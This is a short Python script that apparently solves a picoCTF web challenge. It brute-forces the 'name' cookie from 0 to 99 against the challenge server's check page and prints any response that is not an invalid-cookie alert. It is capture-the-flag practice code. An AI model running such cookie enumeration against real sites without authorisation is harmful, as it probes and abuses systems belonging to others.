#!/usr/bin/env python3.8

import requests
from bs4 import BeautifulSoup

referer = "http://mercury.picoctf.net:21485/"
url = "http://mercury.picoctf.net:21485/check"
headers = {"Referer" : referer}

for i in range(100):
    cookies = {"name" : str(i)}
    response = requests.get(url=url, headers=headers, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")
    el = soup.find("div", attrs={"id": "myAlert"})
    if el == None:
        print(f"name={i}: invalid name.")
    else:
        if "That doesn't appear to be a valid cookie." in el.text:
            print(f"name={i}: invalid cookie.")
        else:
            msg = soup.find("p", attrs={"style": "text-align:center; font-size:30px;"})
            print(f"name={i}: {msg.text}")
